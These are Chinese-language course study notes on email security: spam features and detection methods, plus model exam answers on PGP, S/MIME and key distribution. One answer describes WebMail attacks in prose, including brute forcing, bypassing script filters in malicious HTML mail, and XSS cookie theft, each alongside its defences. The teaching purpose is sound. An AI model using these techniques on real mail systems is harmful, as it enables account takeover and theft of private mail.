课本 p.321 补了原因：「因为人类语言种类众多，人们对信息的感知与接受除了文字，还有图形以及对文字本身的联想，所以很难建立一个好的、通用的并且高效的语义分析模型来分析一封电子邮件的内容是否正常。另外，人为建立一组判定规则也不具有普遍意义，因为每个人对邮件的感受是千差万别的。」

关键结论：垃圾邮件的定义是"主观的"，而机器只会算客观特征。整节的所有技术，都是在用客观特征去逼近一个主观判断 —— 这就是它们全都会误判的根本原因。

4.1 垃圾邮件是什么、危害在哪 课本 p.309

定义
未经用户请求强行发送到用户邮箱中的、不受用户欢迎、难以退掉的电子邮件或电子邮件列表，包括广告邮件、骚扰邮件、传播违法信息邮件等。
危害（四条）
① 增加了网络负载，影响网络传输速度；② 耗费收件人的时间、精力和金钱，严重时可耗尽收件人邮箱的存储空间；③ 影响邮箱服务提供者的形象；④ 频繁转发垃圾邮件的主机常会被因特网服务提供商列入垃圾邮件数据库，导致该主机访问网络受限。

4.2 垃圾邮件的特征 PPT p.39 课本 p.322

为什么先讲特征：课本 p.323「反垃圾邮件技术主要以上特征作为检测依据。」——特征就是后面所有检测方法的原料。
课本先说清楚邮件的构成：「电子邮件主要由邮件地址（包括收发件人邮箱、收发邮件的 IP 地址）、主题、信件内容（关键字、正文、附件）等组成」。

(A) 七个"组成要素"特征 PPT p.39 完整列了这七条

#特征PPT 的说法课本的解释
1内容的重复性内容的大量重复垃圾邮件通常表现为内容的大量重复。
2信息的合法性查不到发件人信息垃圾邮件通常伪造发信人、收信人等信息，查询不到发件人、发件主机的可能是垃圾邮件。
3时间的有效性不正常的发送时间有时会更改发送时间。有些垃圾邮件为了在客户端保持排列第一的位置，会将发送时间强行修改到一个超前的时间。
4地址的有效性无效的发送源地址发送源地址有相当一部分是伪造的；也可通过入侵邮件系统服务器篡改邮件发送的真实路径，使合法邮件用户无法回复或者查询其源地址；而合法邮件的发送地址和传输路径的地址都是真实存在的。
5邮箱名的有效性名称由无意义字符串组成很多垃圾邮件的发送邮箱名是随机生成的无意义字符串，与正常用户的邮箱名差别较大。
6HTML 的合法性不合法的 HTML tag，大量图片有时会使用不合法的 HTML tag（标签），如 iframe、frameset、object 等，嵌入的超链接、图片较多。
7邮件收件人数量大—（PPT 未列）发送者通常把垃圾邮件发给许多用户，表现为收信人地址数量非常多。

(B) 发送行为特征 PPT p.39 的第 7 条 课本 p.322

PPT 原话：「发送行为特征：大批量、时间短、发送源变换」。
课本把根因讲透了：与一般邮件收发相比主要有两点不同 ——

第一：要在不被察觉的情况下发给尽可能多的人

「垃圾邮件制造者希望垃圾邮件可以在不被察觉的情况下发送到世界上尽可能多的邮件用户，以达到利益最大化，所以他通常会在相对集中的一段比较短的时间内大批量发送垃圾邮件。」

第二：源地址大批量且不断变换

「如此多的垃圾邮件的发送源地址通常是大批量的，并且处于不断变换中。垃圾邮件制造者为了隐匿自身的存在，以躲避反垃圾邮件机制的监管，通常会收集网络上存在的开放中继地址，并通过软件来随机编造虚假的或根本不存在的发件人地址，利用 SMTP 协议的漏洞，使用开放中继来完成垃圾邮件的发送。」

这两点具体表现在以下 6 个可测量的指标上（这 6 条正是「基于 SMTP 连接行为」检测的输入）：

#指标判据
1同一 IP 的 SMTP 连接数垃圾邮件通常大批量发送，同一 IP 通常会对邮件服务器端口多次连接。
2同一 IP 的 SMTP 连接频率发送垃圾邮件时，同一 IP 通常对服务器端口的连接频率表现出一定规律。
3同一主题的邮件数量大如果相同主题的邮件转发次数较多，很可能是垃圾邮件。
4同一 IP 发送的邮件数量大如果同一 IP 地址发送的邮件数量超过一定阈值，该 IP 很可能在发送垃圾邮件。
5同一邮箱账号的发送邮件数量大同上，超过一定阈值则该邮箱很可能在发送垃圾邮件。
6发送时间合法邮件的发送时间呈现一定规律，如果在非高峰时段内发送邮件则有可能是在发送垃圾邮件。

4.3 三类反垃圾邮件检测方法 PPT p.40 课本 10.5.1–10.5.3

★ 先把 PPT p.40 这一页的分类框架背下来（简答 7 就考这个）

① 基于地址：黑白名单检测、反向域名验证技术
② 基于内容：分布式协作法、规则过滤法、统计过滤法、关键词过滤法
③ 基于行为：基于邮件通信拓扑相似性、基于邮件用户社交关系、基于 SMTP 连接行为

一句话记住三者的区别：地址看"谁发的"，内容看"写了什么"，行为看"怎么发的"。

课本 p.323 补充：「目前，大部分邮件服务器均支持垃圾邮件的检测及过滤功能，通常将识别出来的垃圾邮件放置在独立的文件夹中（如垃圾邮件、广告邮件等）。如果出现误判，用户可手工将其移动到正常邮件收件箱中。」PPT p.41 贴的网易 163 收费邮箱截图就是这个——它把广告邮件和垃圾邮件分开放在两个不同的文件夹中，页面上写着「广告邮件自动删除 14 天以上的邮件（网易反垃圾系统已帮您拦截 99.8% 的垃圾邮件）」。

① 基于地址的检测 课本 10.5.1

黑白名单检测技术

黑名单的原理：「提前对邮件发送源所发送的邮件性质进行预判，拦截来自身份明确的垃圾邮件发送源所发送的垃圾邮件，是最早出现的一种垃圾邮件检测技术。 其原理是：将已经识别的与垃圾邮件有关的开放中继或邮件源地址记录到数据库（黑名单）中，并通过域名系统为垃圾邮件过滤系统提供查询服务。 当新邮件到来时，检测系统首先检查电子邮件头部的发件人的服务器地址、代理服务器地址和发件人邮箱地址等相关信息，与黑名单中的信息进行匹配，一致则判定为垃圾邮件并进行拦截或拒收。」

为什么后来不好用了：「垃圾邮件刚出现时由于制作技术较为简单，通常邮件来源比较稳定，一般发送方 IP、域名地址和邮箱地址变化不大，因此比较容易收集整理出黑名单。 随着垃圾邮件制作技术的迅速发展，当今的垃圾邮件发送者通常会采取伪装、编造和盗用源地址等手段不断变换发送方地址，因此静态的黑名单很难应对垃圾邮件，必须不断地动态更新。」

著名反垃圾邮件组织（提供垃圾邮件地址黑名单服务）：Spamhaus、Spamcop、CAUSE、MAPS。 「一旦某个 IP 地址被纳入这些反垃圾邮件组织的黑名单，世界上很多邮件服务器就会拒收该 IP 地址发送的任何邮件。」← 这正是 §4.1 危害第 ④ 条的机制。

白名单：「正好和黑名单相反，被列入白名单中的发件人发送的任何电子邮件都将被判断为合法邮件。对于某些用户来说可能宁可多接收一些垃圾邮件，也不愿意漏掉一封合法邮件，所以用户可以根据需要来定义、设置和维护自己的白名单。白名单技术以其操作简易、方便实施和系统负载小等优点被广泛应用在垃圾邮件过滤系统中，以降低误判率。」

技术优点不足（课本原文，简答 7 的得分点）
黑名单「黑名单或白名单检测技术是常用、简单、快捷、有效的垃圾电子邮件检测方法」「黑名单不可能涵盖所有的垃圾邮件地址，容易『殃及无辜』，致使用户丢失合法邮件，垃圾邮件检测总体效率不高。」
白名单「白名单由于『门槛』低，大量垃圾邮件涌入，所以经常达不到预期效果。」
「因此，在实际应用中，黑名单和白名单通常结合起来应用，合称为『黑白名单检测技术』。」
反向域名验证技术

先看"合法邮件的地址"长什么样（课本给了四条判据）：
① Mail From 后的地址和邮件内容中 From 后的地址相同；
② 发件人地址是该域中真实合法的地址；
③ 发送方 IP 地址应该是 Mail From 后的地址域中允许该域名发送邮件的计算机地址；
④ To 后地址可以与 Rcpt To 后的地址不同。（注意这一条是"可以不同"——群发和密送就是这么来的，不能拿它当垃圾判据。）

做法：「针对虚假或伪装源地址形式的垃圾邮件，反向域名验证技术采集分析 SMTP 会话和邮件头部中的地址信息，通过 DNS 对准备接收的邮件发送 IP 地址进行反向解析。 如果反向 DNS 查询可以通过邮件传输路径中的地址逐步追查到其源地址，则认为该邮件合法并接收； 如果追查不到其源地址或者查询的源地址不存在，则认为该邮件可能存在问题而拒绝接收。」

致命缺点：「由于邮件系统中大部分 DNS 服务器没有开放反向解析查询权限，致使反向域名解析过滤垃圾邮件技术的误判率较高，严重影响邮件用户的正常使用，因此该技术很难被推广。」

② 基于内容的检测 课本 10.5.2

「基于内容的垃圾邮件检测技术通过对邮件内容进行分析来识别垃圾邮件。当前常用的基于内容识别的垃圾邮件检测方法主要分为四类：分布式协作法、规则过滤法、统计过滤法、关键字过滤法。」

方法原理优点缺点
分布式
协作法		大量邮件服务器共享垃圾邮件的指纹信息，并以此作为检测依据。邮件服务器在接收到邮件后，首先利用哈希算法对邮件中的指纹数据进行计算，生成邮件的指纹，如果用户或服务器判断其为垃圾邮件，则将指纹数据共享给其他有协作关系的邮件服务器作为检测依据。「在应对大范围爆发的蠕虫等病毒入侵式垃圾邮件方面有很好的拦截效果」——这类垃圾邮件特征是数量大、易分析、极相似、变化小，很容易被识别。① 「假如垃圾邮件小规模传送，内容又是变化很大的情况下，该方法就很难发挥作用。」
② 「此类方法需要邮件用户自行上报垃圾邮件，但是很多邮件用户并没有自主上报的习惯。」
规则
过滤法		对垃圾邮件进行人为的分析，整理出其相应的特征信息，将这些特征设定成邮件信头部分和内容部分的匹配规则，即通过学习和训练得到的显性规则，然后将接收的邮件与规则进行比较计算来判别邮件是否合法。规则的学习训练过程即是归纳总结的过程，所有的规则都是通过对样本进行训练和学习总结而形成的。
常用的有 Ripper、Decision Tree（决策树法）、Boosting、Rough Set。其中决策树法采用的算法主要有 C4.5、ID3 和 C5.0，通过对训练集中具有较高权值的单词和邮件头信息的学习和训练，构造决策树模型对垃圾邮件进行识别，该方法应用在小规模训练集的垃圾邮件比率较高的邮件中表现出较好效果。		「设定的规则便于人理解，原理简单，易于操作，在某种程度上满足一般用户的要求。」① 「需要根据用户的不同需求长时间手动维护和调整规则，因此依靠人的主观因素较多，缺乏灵活性，不利于及时更新。」
② 「该方法对用户专业技术能力要求较高。」
③ 「误判率较高，较适合作为其他过滤技术的辅助手段。」
（后来也发展出了具有动态学习功能的规则。）
统计
过滤法		将邮件内容部分进行分词，即把内容部分划分成固定长度的单词向量和字串，然后提取特征值，运用概率统计知识通过合法邮件和垃圾邮件样本的训练建立一系列的分类模型，并利用这样的模型对这些字串和向量进行评分，从而过滤垃圾邮件。
常见算法：k 临近算法、贝叶斯算法、支持向量机、Winnow 算法和神经网络算法。		「依赖样本训练集的实时性，可以自适应学习建立识别模型。」「其分类模型的非共享性，即一个邮件用户训练出来的分类模型很难适应另一个邮件用户的需求，所以该方法推广性较差。」
关键字
过滤法		将垃圾邮件主题中经常出现的字词建立一个词汇表并赋予一定的权值，作为判别垃圾邮件的依据。过滤系统在收到邮件后，会对邮件主题中的词汇进行分析，通过关联垃圾邮件主题词汇表中的信息计算权值，如果该邮件权值超过指定阈值则认为该邮件不合法，并拒绝接收。「针对的是邮件主题，可以有效识别一些主题明显的垃圾邮件。」① 「需要建立一个数量庞大的关键字列表，它的识别准确率和词汇表中的信息的完备性密切相关。」
② 「词汇表太大也会消耗邮件服务器的大量系统资源。」

③ 基于行为的检测 课本 10.5.3

它是为了补什么洞才出现的（这段是简答 7 的关键论据）

课本原文：「前面介绍的基于地址的垃圾邮件检测技术和基于内容的垃圾邮件检测技术虽然可以较为有效地识别垃圾邮件，但是这些方法都有其各自的局限性，特别是涉及检测依据需要不断更新，有特征提取及匹配的计算量比较大等缺点。」

基本原理：「在邮件传输过程中，获取大量邮件发送样本的行为信息，如发送时间、频率和 IP 地址等，进行有针对性的分析、学习和训练，建立一套对付垃圾邮件的行为识别模型，进而分析判断邮件是否合法。」

最大特点（四条优点，全是课本原文）：
① 「不必完整接收邮件，不必查看邮件中的具体内容」；
② 「由于与邮件内容无关，进而避免了类似其他反垃圾邮件技术对邮件内容异常烦琐的分析和计算」；
③ 「大大减轻了网络资源的占用，提高了垃圾邮件过滤系统的处理能力和速度」；
④ 「同时由于其不用打开邮件内容，也避免了对个人隐私的侵犯」。
→ ④ 这条经常被漏掉，但它是基于行为相对于基于内容独有的优势。

方法怎么做（课本原文要点）
基于邮件通信
拓扑相似性		「通过对邮件收发件人的通信关系建模，把收发件人作为顶点、通信行为作为有向边建立通信关系网络拓扑，计算相似度将邮件用户划分成若干用户群，然后通过计算用户属于哪个群来判别该用户发送的邮件是否合法。
由于合法用户之间通信通常是双向交流的，而垃圾邮件发送为了追逐利益大宗发送不考虑用户通信关系，所以该方法利用发件人的行为动机来识别垃圾邮件。」
→ 判据的本质：正常人是"你来我往"，群发者是"只出不进"。
基于邮件用户
社交关系		「考虑到通常情况下邮件用户之间的合法通信是在具有一定社交关系的用户之间这一现象，该方法利用社交网络的社团划分算法将邮件用户通信关系划分为若干个用户社团，社团内的用户间通信一般是正常的，而社团间联系较少或从来没有联系的用户之间通信是可疑的，以此判断邮件的合法性。」
基于 SMTP
连接行为		「通过对 SMTP 连接时的连接时间、频率、流量、对应主机名和域名、PTR 记录等特征，对邮件发送方的行为进行识别从而判断垃圾邮件。当前流行的识别方法中，利用检测用户连接频率来识别垃圾邮件的方法就是以这个原理为基础的。
常用的 Postfix 邮件服务器可以通过记录用户出现错误的次数，对可疑的用户延迟响应时间，延迟时间能够随着错误数量的增加而增加。当用户出错次数超过一个阈值时，服务器就会与该用户断开连接，从而增强了对大宗垃圾邮件的识别能力。」
→ 这就是所谓的 tarpitting（焦油坑）：不拒绝你，只是越来越慢地回你，把群发者的时间成本拖垮。

5.2 简答题（12 题，课本未给答案）

1.分析电子邮件协议的安全缺陷。
答　根本原因：基于 SMTP、POP3/IMAP 等协议的电子邮件系统本身没有采取必要的安全防护措施——邮件的发送和接收没有经过鉴别和确认，邮件内容没有经过加密p.309。具体缺陷有：
① 机密性缺失：SMTP 发送邮件时邮件以明文方式在网上传输，也以明文方式保存在邮件服务器的用户邮箱中。只要能进入用户邮箱或在传输过程中截获，就能看到原始文件。
② 真实性缺失：发邮件时不需要身份认证，任何人都可以冒名发送电子邮件，因此用户接收的邮件可能并非其所声称的发件人所发——导致电子邮件欺骗、钓鱼邮件。
③ 完整性缺失：攻击者截获后甚至可以更改邮件的内容，而邮件的接收者无法知道所接收的邮件是否真实。
④ 不可否认性缺失：没有签名机制，发送人可以否认自己发过的邮件。
⑤ SMTP 的开放中继被滥用：垃圾邮件制造者收集网络上存在的开放中继地址，利用 SMTP 协议的漏洞，使用开放中继来完成垃圾邮件的发送p.322，由此产生垃圾邮件与邮件炸弹。
⑥ 可传播恶意代码：可通过邮件信息、特别是邮件附件传播病毒、木马、蠕虫，是 APT 攻击最常使用的手段。
⑦ WebMail 场景下，若只用 HTTP 而非 HTTPS，登录的用户名和口令也是明文传输，可被直接抓包获取。
2.在 PGP 中，发送方执行签名、加密、压缩操作的顺序是什么？为什么要按这样的顺序进行？
答　顺序：先签名 → 再压缩 → 最后加密（完整链条为：散列 → 签名 → 与正文拼接 → 压缩 → 对称加密 → 与加密的会话密钥拼接 → Base64 编码 → 分段）。p.312
（一）签名为什么排在压缩之前，有两点原因：
① 便于验证：对没压缩的消息进行签名，可便于对签名的验证；如果在压缩后再签名，则需要保存压缩后的消息，或在验证时重新压缩消息，增加了处理的工作量。
② 压缩结果不唯一：压缩算法 ZIP 在不同的实现中会在运算速度和压缩率之间寻求平衡，因而可能会产生不同的压缩结果（虽然直接解压结果相同），因此压缩后再签名可能导致无法实现鉴别——接收方验证签名时可能会因压缩的原因而出现验证失败。
（二）压缩为什么排在加密之前，也有两点原因：
① 省资源：先压缩再加密缩短了报文大小，从而减少了网络传输时间和存储空间。
② 更安全：经过压缩实际上是经过了一次变换，变换后减少了明文中上下文的关系，比原始消息的冗余信息更少，再加密的安全性更高；而如果先加密再压缩，效果会差一些（补充：密文接近随机数，几乎压不动）。
3.在密钥信任方面，X.509 和 PGP 有什么不同？
答　核心差别是「信任从哪里来」：X.509 是自上而下的权威传递，PGP 是横向的熟人扩散。p.315–316、p.311
对比项X.509（PKI，S/MIME 采用）PGP
信任模型层次化 / 树状结构，以 CA 为中心以用户为中心的信任模型，即信任网 Web of Trust，网状结构
谁能签公钥由上一级的组织（CA）负责认证下一级的组织和个人没有统一的认证中心，每个人都可以作为一个 CA 对某个用户的公钥签名
信任的依据信任根 CA，沿证书链自上而下传递两点：① 直接来自你所信任的人的公钥；② 由你所信任的人为你并不熟悉的人所签署的公钥
信任的粒度基本是二值的：证书有效 / 无效多级且可加权：拥有者可信性分不信任、部分信任、一直信任、绝对信任四档，由用户自定；密钥合法性由加权和 ≥ 1 计算得出
撤销机制有严格的证书撤销机制缺少 PKI 那样严格的证书撤销机制，靠所有者自行发布公钥撤销证书，是 PGP 安全体系中比较薄弱的环节
适用场景比较适合具有层次结构的组织使用适合个人之间、没有统一权威的场合
补充：PGP 后来也支持 X.509 和 CA 认证中心，但并没有被广泛采用，因此 PGP 的公钥管理主要还是采用信任网模型。
4.简述 PGP 中会话密钥的产生过程。
答p.314　会话密钥 Ks 由伪随机数生成器 PRG 产生，该 PRG 基于美国国家标准「金融机构密钥管理（大规模）」ANSI X 9.17 中定义的随机数生成方法，产生 128 位随机数，只用于一条消息的一次加解密过程。具体过程：
① 随机数产生器的输入包括：1 个 128 位密钥和 2 个 64 位待加密的明文块（随机数种子）。
② 种子的产生：随机数种子由键盘输入产生（用户应尽量随机无规律地击键）。用户随机键入 12 个字符，将键入的每一个字符表示成 8 比特的数值，12 个字符共 96 比特，再加上表示键入日期/时间的 32 比特，形成一个 128 比特的随机数据流。
③ 然后将此数据流分成两个 64 比特的明文分组，输入随机数产生器中；128 位密钥为上一次算法输出的会话密钥。
④ 随机数产生器根据输入的种子和密钥产生 2 个 64 位密文块，串联起来形成 128 位的会话密钥。
（ANSI X 9.17 最初规定的加密算法是 DES，后续标准中增加了 3DES、IDEA、CAST-128、AES 等。）
⑤ 安全交换：会话密钥使用接收方的公开密钥加密后发送给接收方，接收方收到后用自己的私钥解密得到本次会话的会话密钥。PGP 通过这种方法实现了会话密钥的安全交换。
5.简述在 PGP 中，密钥合法性字段的取值计算方法，并举例说明。
答p.316　密钥合法性字段的取值，由此公钥的所有签名的「签名可信性字段」的取值计算得到。计算方法如下：
① 如果该公钥的签名可信性字段中至少有一个标志为「绝对信任」，则将此公钥的密钥合法性字段标志为「合法」。
② 否则，PGP 计算所有签名信任值的加权和：签名可信性字段标志为「一直信任」的权重为 1/X，标志为「部分信任」的权重为 1/Y，其中 X 和 Y 是用户设置的参数。当加权和等于或大于 1 时，将密钥合法性字段标志为「合法」，即公钥是有效的。
③ 因此，在没有绝对信任的情况下，需要至少 X 个签名是可信的（一直信任），或者至少 Y 个签名是可信的（部分信任），或者上述两种情况的某种组合。
举例（课本原例）：设 X = 1，Y = 2，则一个「一直信任」的密钥拥有者签名的公钥即为合法密钥；两个「部分信任」的密钥拥有者签名的公钥也为合法密钥。
再举一例：设 X = 2，Y = 4（一直信任记 1/2，部分信任记 1/4）——
・2 个"一直信任"：1/2 + 1/2 = 1 ≥ 1，合法；
・4 个"部分信任"：4 × 1/4 = 1 ≥ 1，合法；
・1 个"一直信任" + 2 个"部分信任"：1/2 + 1/4 + 1/4 = 1 ≥ 1，合法（即上述的"某种组合"）；
・1 个"一直信任" + 1 个"部分信任"：1/2 + 1/4 = 3/4 < 1，不合法。
特例：若某用户是拥有一个或多个未知用户签名的孤立用户（公钥从公钥服务器上取得），由于没有信任者的签名，PGP 认为该用户的公钥是不合法的。
6.简要说明 WebMail 所面临的安全问题。
答10.4 节　WebMail 用浏览器充当邮件用户代理，因此Web 应用面临的很多安全问题同样在 WebMail 中存在。主要有三类：
① WebMail 暴力破解。WebMail 的密码验证是以提交表单的形式交由服务端程序（CGI、ASP 等）处理的，攻击者借助 wwwhack、小榕的溯雪等工具不断用不同的密码尝试登录，通过比较返回页面的异同判断是否破解成功。防范措施有禁用账户、禁止 IP 地址、登录检验（验证码）三种，但各有缺陷：禁用账户可能被利用形成 DoS 攻击；禁止 IP 会误伤共用同一 IP 的网吧、公司、学校用户，且攻击者可用多个代理轮换或分布式破解绕过；登录检验的字符串若在页面文本中可被工具提取后再提交（因此检验字符串最好包含在文件名随机的图片中）。最终仍主要靠用户自己采取良好的密码策略。
② 恶意 HTML 邮件。HTML 邮件可含字体、链接、图像、声音等。利用它攻击者能进行电子邮件欺骗，甚至欺骗用户更改自己的邮箱密码（预先给"新密码"表单元素赋值，诱骗用户提交）；在 HTML 邮件中嵌入恶性脚本程序（JavaScript / VBScript，调用 ActiveX 控件或结合 WSH），能修改注册表、非法操作文件、格式化硬盘、耗尽系统资源、修改"开始"菜单，甚至删除和发送用户的邮件、访问用户的地址簿、修改邮箱账户密码。攻击者还可通过事件属性、把 URI 资源类型设为 javascript、SGML 字符引用（转十六进制）、样式表 @import 等方式绕过 WebMail 的脚本过滤，或用 refresh、iframe、scriptlet 在用户打开邮件时引入另一个含恶意代码的 HTML 文件，从而同时避开脚本过滤与防毒查杀。注意：WebMail 系统会过滤，但 POP3 服务器上并不过滤，用客户端收信仍要谨防。
③ Cookie 会话攻击。WebMail 需进行用户会话跟踪（Cookie 会话跟踪、URL 会话跟踪）。攻击者一旦获取用户的 Cookie 信息就能很容易地侵入用户的 WebMail 邮箱；获取方法主要有内网监听和 XSS（跨站脚本）攻击——含恶性脚本的 HTML 邮件可先提取当前 WebMail 的 Cookie，赋值给某个表单元素，再自动提交给攻击者。其中持久型 Cookie 只需复制到攻击者自己的 Cookie 文件中即可使用；临时 Cookie 存于内存不易存取，攻击者可借助 HTTP 代理程序 Achilles 截取并编辑。防范：WebMail 系统应避免使用持久型 Cookie 会话跟踪；用户应设置浏览器的 Cookie 安全级别、使用 Cookie 管理工具（Cookie Pal、Burnt Cookie）、及时给浏览器打补丁。
7.比较分析基于地址的垃圾邮件检测、基于内容的垃圾邮件检测以及基于行为的垃圾邮件检测方法的优缺点。
答　三者的判断依据分别是「谁发的」「写了什么」「怎么发的」。10.5.1–10.5.3
① 基于地址的检测（黑白名单检测、反向域名验证）。
优点：是常用、简单、快捷、有效的检测方法；白名单还具有操作简易、方便实施、系统负载小的优点，被广泛用于降低误判率。
缺点：黑名单不可能涵盖所有的垃圾邮件地址，容易"殃及无辜"，致使用户丢失合法邮件，总体效率不高；且垃圾邮件发送者会伪装、编造和盗用源地址不断变换地址，静态黑名单很难应对，必须不断动态更新。白名单"门槛"低，大量垃圾邮件涌入，经常达不到预期效果。反向域名验证则因大部分 DNS 服务器没有开放反向解析查询权限，误判率较高，严重影响正常使用，很难被推广。实际应用中黑白名单通常结合使用。
② 基于内容的检测（分布式协作法、规则过滤法、统计过滤法、关键字过滤法）。
优点：直接分析邮件本体，针对性强。分布式协作法对大范围爆发的蠕虫等病毒入侵式垃圾邮件拦截效果很好（此类邮件数量大、易分析、极相似、变化小）；规则过滤法规则便于人理解、原理简单、易于操作；统计过滤法可自适应学习建立识别模型；关键字过滤法能有效识别一些主题明显的垃圾邮件。
缺点：普遍存在检测依据需要不断更新、特征提取及匹配的计算量比较大的问题，且必须打开邮件内容。具体地：分布式协作法在垃圾邮件小规模传送、内容变化很大时很难发挥作用，且需要用户自行上报而很多用户没有上报习惯；规则过滤法需长时间手动维护调整规则、主观因素较多、缺乏灵活性、不利于及时更新、对用户技术能力要求较高、误判率较高，较适合作为辅助手段；统计过滤法分类模型具有非共享性，一个用户训练出的模型很难适应另一个用户，推广性较差；关键字过滤法需要建立数量庞大的关键字列表，准确率与词汇表完备性密切相关，词汇表太大又会消耗服务器大量系统资源。
③ 基于行为的检测（邮件通信拓扑相似性、邮件用户社交关系、SMTP 连接行为）。
优点（正是为弥补前两类的局限而提出）：① 不必完整接收邮件，不必查看邮件中的具体内容；② 由于与邮件内容无关，避免了对邮件内容异常烦琐的分析和计算；③ 大大减轻了网络资源的占用，提高了垃圾邮件过滤系统的处理能力和速度；④ 由于不用打开邮件内容，避免了对个人隐私的侵犯。
缺点：需要获取大量邮件发送样本的行为信息进行分析、学习和训练才能建立行为识别模型，建模成本高；判据是统计规律，对刻意模仿正常行为、低速小量发送的垃圾邮件不敏感；而且只看行为不看内容，无法判断邮件本身内容是否违法有害。
结论：三类方法各有局限，实际的反垃圾邮件系统总是把它们组合起来使用。
8.比较分析 PEM、S/MIME、PGP 的优缺点。
答p.310–311　三者是端到端安全电子邮件的三种方案，各自使用不同的安全方案，相互不兼容，导致无法实现互操作。
① PEM（隐私增强电子邮件）。美国 RSA 实验室基于 RSA 和 DES 算法开发。
优点：出现最早；在电子邮件标准格式上一次性增加了加密、认证、消息完整性保护和密钥管理四项功能，功能完整。
缺点：① 由于 PEM 在 MIME 之前提出，因此并不支持 MIME，只支持文本信息（无法处理附件和二进制数据）；② 依赖于 PKI 并遵循 X.509 认证协议，而当时要建立一个可用的 PKI 并不容易。→ 未能推广。
② S/MIME（安全/多用途因特网邮件扩展）。在 PEM 基础上发展，使用 RSA 提出的 PKCS 和 MIME，对邮件主体进行完整性保护、签名和加密后作为特殊的附件发送。
优点：① 支持 MIME，可处理任意类型数据；② 不仅用于安全电子邮件传输，任何支持 MIME 格式的数据传输机制或协议（如 HTTP）均可使用它；③ 获得了广泛的行业支持，已经内置于大多数电子邮件客户端软件（如 Outlook、Foxmail）和 Web 浏览器中。
缺点：认证机制依赖于层次结构的证书认证机构，所有下一级的组织和个人的证书由上一级的组织负责认证，整个信任关系是树状结构，因此比较适合具有层次结构的组织使用——个人用户需向 CA 申请证书，使用门槛较高、灵活性差。（另：相关 RFC 2311/2312/3850/3851 是信息文件，而不是标准或建议的标准。）
③ PGP（优良隐私保护）。1991 年由菲利普·齐默尔曼开发，既是一个特定的安全电子邮件应用软件，也是一个安全电子邮件标准。
优点：① 没有采用严格（类似 PKI）的公钥管理方案，而是提供了一种解决公钥管理问题的框架，并给出几种可选方案供用户选择，采用信任网，不需要统一的 CA，个人用户直接可用、部署灵活；② 只对邮件正文处理，对邮件系统的体系结构及收发协议不做任何修改，只要收发双方的用户代理支持 PGP 即可，无须更改邮件服务器；③ 有 OpenPGP 开放标准和 GnuPG（GPG）免费实现，跨平台生态丰富；④ 不限于电子邮件，可用于任何需要保证传输机密性、完整性和认证的应用。
缺点：① 信任网依赖用户主观设置信任级别，难以规模化，公钥合法性判断不够客观；② 缺少 PKI 体系那样严格的证书撤销机制，很难确保没有人使用一个已不安全的密钥，是 PGP 安全体系中比较薄弱的环节；③ PGP 属于商业软件（早期免费，从 8.1 版开始收费）；④ 默认使用 SHA-1 做身份认证的旧版本已被 2019 年的 SHA-1 选择前缀冲突攻击攻破（GnuPG 2.2.18 起将 2019-01-19 之后基于 SHA-1 创建的身份签名视为无效）。
9.现有的加密电子邮件解决方案，如 S/MIME、PGP 等，大都是对邮件正文进行安全处理的。分析这样设计的原因。
答　主要有三方面原因：
① 为了不改动现有邮件系统，实现"可增量部署"。p.314 课本原话：「由于 PGP 只是对邮件正文进行处理，而对邮件系统的体系结构及收发协议没有做任何修改，因此，只要收发双方的用户代理支持 PGP，就可在现有的邮件系统中进行安全的电子邮件交换，而无须对邮件服务器进行任何更改。」——全世界的邮件服务器不可能同时升级，把改动限制在两端的用户代理里，是唯一可行的路线。
② 邮件的信封和首部在功能上必须保持明文。邮件的传输程序要根据信封上的信息（尤其是收信人地址）来传送邮件，邮件服务器还要靠域名查 DNS 的 MX 记录来路由。如果把收发件人地址、路由信息一起加密，中间的邮件服务器就无法投递、无法路由，邮件根本走不出去。
③ 安全属性的需求本来就集中在正文上。四项安全需求（机密性、完整性、不可否认性、真实性）保护的对象是邮件的内容；至于"谁在什么时候给谁发过信"这类元数据的保护，超出了端到端邮件加密的目标范围，需要靠传输层/网络层的安全协议（SSL/TLS、IPsec）另行解决。
代价（可作为补充）：正因如此，PGP/S-MIME 无法隐藏通信关系（谁和谁通信、主题、时间），这是端到端邮件加密公认的局限。
10.在密码学中有多种保护对称的会话密钥安全分发的方法。请分别说明 PGP、Needham-Schroeder 协议、SSL 协议是如何保护会话密钥的安全分发的？其中哪些使用的是数字信封技术？
答
① PGP：发送方用伪随机数生成器随机产生一次性会话密钥 Ks（不需要和接收方协商密钥，且只用一次），然后用接收方的公开密钥 PUB 对 Ks 加密，把加密后的 Ks 与用 Ks 加密的报文拼接在一起发送；接收方用自己的私钥 PRB 解密得到 Ks，再用 Ks 解密报文。属于数字信封。p.312、p.314
② Needham-Schroeder 协议：依靠可信第三方 KDC（密钥分发中心）。通信双方 A、B 各自与 KDC 预先共享一个对称主密钥；A 向 KDC 请求与 B 通信，KDC 生成会话密钥 Ks，分别用与 A、与 B 共享的主密钥加密后分发（发给 A 的那份里还包含"转交给 B 的票据"）。协议中使用随机数（nonce）来防止重放攻击。全程只使用对称密码算法，不使用公开密码算法，因此不属于数字信封。
③ SSL / TLS 协议：在握手阶段，若采用 RSA 密钥交换，则客户端生成预主密钥（pre_master_secret），用服务器证书中的公钥加密后发送给服务器，服务器用自己的私钥解密；双方再由预主密钥＋双方随机数导出主密钥和各项会话密钥。这一步属于数字信封。（若采用 DH/ECDHE 密钥协商模式，则是双方协商生成，此时不属于数字信封。）
结论：使用数字信封技术的是 PGP 和 SSL（RSA 密钥交换模式）；Needham-Schroeder 协议不是。
→ 对应单选 14：没有采用公开密码算法进行对称会话密钥分发的正是 Needham-Schroeder。
11.众所周知，RSA 加密比较长的明文时速度很慢，PGP 却有两处使用了 RSA 进行加密操作，为什么？既然可以使用 RSA 实现数据的机密性保护，为什么在 PGP 中却使用对称加密算法（如 IDEA）对邮件数据进行加密？
答
（一）为什么两处用 RSA 不要紧——因为这两处的数据都很短、且长度固定。
PGP 中使用 RSA 的两处是：
・数字签名：不是对整封邮件签名，而是先用单向散列函数（如 SHA-1）算出消息的散列值，再对这个散列值签名。散列值是定长的短数据（SHA-1 为 160 比特），做一次公钥运算的开销可以接受。
・加密会话密钥：用接收方的公钥加密的只是 128 位的会话密钥 Ks，也是定长的短数据。
也就是说，RSA 在 PGP 中只作用在"短小的定长数据"上，从不直接作用在长度不可控的邮件正文上，因此"RSA 慢"这个缺点被规避掉了。
（二）为什么邮件数据要用对称算法——性能与密钥分发的双重考虑。
・性能：公开密码算法基于大数模幂等复杂运算，速度远低于对称密码算法。邮件正文长度不可预知，可能很大，用 RSA 直接加密在实际中不可行。
